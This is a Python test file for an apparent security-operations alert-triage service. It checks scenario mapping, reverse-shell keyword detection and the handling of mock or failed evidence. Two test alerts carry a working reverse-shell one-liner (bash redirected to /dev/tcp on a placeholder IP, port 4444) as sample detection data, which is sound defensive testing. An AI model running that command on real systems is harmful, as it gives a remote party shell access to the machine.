from __future__ import annotations

from soc_agent.contracts import (
    AlertClassification,
    AlertInput,
    AlertSourceRef,
    AlertSourceType,
    AnalysisRun,
    AnalysisRunStatus,
    DetectionRuleRef,
    InvestigationEvidence,
    SocDomainFindingDisposition,
    SocDomainName,
    SocDomainTriageRequest,
)
from soc_agent.domain import SocDomainTriageService


def test_domain_triage_preserves_unmapped_vendor_scenario_hint() -> None:
    alert = AlertInput(
        alert_id="ALT-UNMAPPED-SCENARIO",
        source=AlertSourceRef(source_type=AlertSourceType.SIEM, vendor="vendor-a", product="case-center"),
        detection=DetectionRuleRef(rule_name="Database sensitive table batch query", rule_category="数据安全"),
        classification=AlertClassification(category="数据库访问异常"),
        raw={"message": "应用账号在短时间内批量查询多张敏感表，需要结合工单和业务窗口核查。"},
    )
    run = AnalysisRun(
        run_id="RUN-UNMAPPED-SCENARIO",
        alert_id=alert.alert_id,
        status=AnalysisRunStatus.NEEDS_REVIEW,
        input_payload=alert.model_dump(mode="json"),
    )

    result = SocDomainTriageService().triage(
        SocDomainTriageRequest(
            run=run,
            domain=SocDomainName.GENERIC,
            metadata={"similar_alert_count": 1},
        )
    )

    scenario_findings = [finding for finding in result.findings if finding.scenario_key]
    assert len(scenario_findings) == 1
    finding = scenario_findings[0]
    assert finding.scenario_key == "vendor.unmapped"
    assert finding.disposition == SocDomainFindingDisposition.NEEDS_MORE_EVIDENCE
    assert "数据库访问异常" in finding.vendor_scenarios
    assert "数据安全" in finding.vendor_scenarios
    assert finding.current_conclusion.automation_allowed is False
    assert finding.current_conclusion.recommended_queue == "soc_review"
    assert finding.evidence_profile.sources["similar_alerts"] == "available"
    assert finding.metadata["taxonomy_candidate"] is True


def test_domain_triage_uses_internal_scenario_when_keyword_matches() -> None:
    alert = AlertInput(
        alert_id="ALT-REVERSE-SHELL",
        source=AlertSourceRef(source_type=AlertSourceType.EDR, vendor="vendor-a", product="endpoint"),
        detection=DetectionRuleRef(rule_name="Endpoint shell behavior", rule_category="未映射终端场景"),
        classification=AlertClassification(category="终端异常"),
        raw={"message": "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1 reverse shell"},
    )
    run = AnalysisRun(
        run_id="RUN-REVERSE-SHELL",
        alert_id=alert.alert_id,
        status=AnalysisRunStatus.NEEDS_REVIEW,
        input_payload=alert.model_dump(mode="json"),
    )

    result = SocDomainTriageService().triage(SocDomainTriageRequest(run=run, domain=SocDomainName.EDR))

    scenario_keys = {finding.scenario_key for finding in result.findings if finding.scenario_key}
    assert "execution.reverse_shell" in scenario_keys
    assert "vendor.unmapped" not in scenario_keys


def test_domain_triage_does_not_treat_mock_or_failed_evidence_as_authoritative() -> None:
    alert = AlertInput(
        alert_id="ALT-MOCK-EVIDENCE",
        source=AlertSourceRef(source_type=AlertSourceType.EDR),
        detection=DetectionRuleRef(rule_name="Endpoint process alert"),
    )
    run = AnalysisRun(
        run_id="RUN-MOCK-EVIDENCE",
        alert_id=alert.alert_id,
        status=AnalysisRunStatus.NEEDS_REVIEW,
        input_payload=alert.model_dump(mode="json"),
    )
    evidence = [
        InvestigationEvidence(
            evidence_id="EVI-MOCK",
            route="endpoint.process_tree.lookup",
            action="endpoint.process_tree.lookup",
            status="success",
            message="mock process tree",
            mocked=True,
            result_payload={
                "process_tree_found": True,
                "process_tree": {"processes": [{"risk_tags": ["credential_access"]}]},
            },
        ),
        InvestigationEvidence(
            evidence_id="EVI-FAILED",
            route="endpoint.process_tree.lookup",
            action="endpoint.process_tree.lookup",
            status="failed",
            message="real provider failed",
            result_payload={
                "process_tree_found": True,
                "process_tree": {"processes": [{"risk_tags": ["credential_access"]}]},
            },
        ),
    ]

    result = SocDomainTriageService().triage(
        SocDomainTriageRequest(
            run=run,
            domain=SocDomainName.EDR,
            investigation_evidence=evidence,
        )
    )

    finding = result.findings[0]
    assert finding.disposition is SocDomainFindingDisposition.NEEDS_MORE_EVIDENCE
    assert finding.confidence == 0.5
    assert finding.evidence_refs == ["EVI-MOCK"]
    assert finding.metadata["risk_tags"] == []
    assert finding.metadata["mock_evidence_count"] == 1
    assert finding.evidence_profile.sources["mock_action_evidence"] == "available"
    assert finding.evidence_profile.sources["read_only_action_evidence"] == "missing"


def test_scenario_confidence_only_uses_successful_non_mock_evidence() -> None:
    alert = AlertInput(
        alert_id="ALT-REVERSE-SHELL-EVIDENCE",
        source=AlertSourceRef(source_type=AlertSourceType.EDR),
        detection=DetectionRuleRef(rule_name="Reverse shell behavior"),
        raw={"message": "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"},
    )
    run = AnalysisRun(
        run_id="RUN-REVERSE-SHELL-EVIDENCE",
        alert_id=alert.alert_id,
        status=AnalysisRunStatus.NEEDS_REVIEW,
        input_payload=alert.model_dump(mode="json"),
    )
    mock_evidence = InvestigationEvidence(
        evidence_id="EVI-MOCK-PROCESS-TREE",
        route="endpoint.process_tree.lookup",
        action="endpoint.process_tree.lookup",
        status="success",
        message="mock process tree",
        mocked=True,
        result_payload={"process_tree_found": True},
    )
    real_evidence = mock_evidence.model_copy(
        update={
            "evidence_id": "EVI-REAL-PROCESS-TREE",
            "message": "real process tree",
            "mocked": False,
        }
    )

    without_evidence = SocDomainTriageService().triage(SocDomainTriageRequest(run=run, domain=SocDomainName.EDR))
    with_mock = SocDomainTriageService().triage(
        SocDomainTriageRequest(
            run=run,
            domain=SocDomainName.EDR,
            investigation_evidence=[mock_evidence],
        )
    )
    with_real = SocDomainTriageService().triage(
        SocDomainTriageRequest(
            run=run,
            domain=SocDomainName.EDR,
            investigation_evidence=[real_evidence],
        )
    )

    baseline = next(item for item in without_evidence.findings if item.scenario_key == "execution.reverse_shell")
    mocked = next(item for item in with_mock.findings if item.scenario_key == "execution.reverse_shell")
    authoritative = next(item for item in with_real.findings if item.scenario_key == "execution.reverse_shell")
    assert mocked.confidence == baseline.confidence
    assert "EVI-MOCK-PROCESS-TREE" in mocked.evidence_refs
    assert authoritative.confidence > mocked.confidence
